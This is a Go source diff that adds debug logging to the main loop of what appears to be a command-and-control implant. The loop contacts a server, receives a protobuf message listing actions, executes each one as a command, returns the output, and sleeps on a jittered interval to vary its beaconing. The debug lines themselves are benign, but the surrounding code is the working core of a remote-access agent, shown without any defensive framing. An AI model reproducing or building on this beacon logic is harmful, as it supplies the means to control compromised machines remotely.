@@ -58,9 +58,18 @@ func main() {
 			endCheck()
 			continue
 		}
+		if DEBUG {
+			fmt.Printf("Writing payload to conn...\n")
+		}
 		conn.Write(payload)
 		data := make([]byte, 16384)
+		if DEBUG {
+			fmt.Printf("Reading data from conn...\n")
+		}
 		conn.Read(data)
+		if DEBUG {
+			fmt.Printf("Got response: %s\n", data)
+		}
 		resp := &mcs.MCS{}
 		err = proto.Unmarshal(data, resp)
 		if err != nil {
@@ -71,6 +80,9 @@ func main() {
 			continue
 		}
 		mode := resp.GetMode()
+		if DEBUG {
+			fmt.Printf("Recd mode: %s\n", mode)
+		}
 		if mode == "0" {
 			endCheck()
 			continue
@@ -78,6 +90,9 @@ func main() {
 		actions := resp.GetActions()
 		for _, acn := range actions {
 			uid := acn.GetUuid()
+			if DEBUG {
+				fmt.Printf("Handling action: %s\n", uid)
+			}
 			mod := acn.GetMode()
 			args := acn.GetArgs()
 			acnOut := cUtils.ExecCommand(mod, args)
@@ -91,6 +106,9 @@ func main() {
 					fmt.Printf("Error marshalling data: %s\n", err.Error())
 				}
 			}
+			if DEBUG {
+				fmt.Printf("Writing response data...\n")
+			}
 			conn.Write(acnData)
 			acnAck := make([]byte, 512)
 			conn.Read(acnAck) // read the "Add response" status, even tho we don't check it rn
@@ -100,11 +118,17 @@ func main() {
 		min := INTERVAL - DELTA
 		max := INTERVAL + DELTA
 		sleeptime := rand.Intn(max-min) + min
+		if DEBUG {
+			fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
+		}
 		time.Sleep(time.Duration(sleeptime) * time.Second)
 	}
 }
 
 func endCheck() {
+	if DEBUG {
+		fmt.Printf("Checking if program should exit...\n")
+	}
 	if len(os.Args) == 3 {
 		os.Exit(0)
 	}
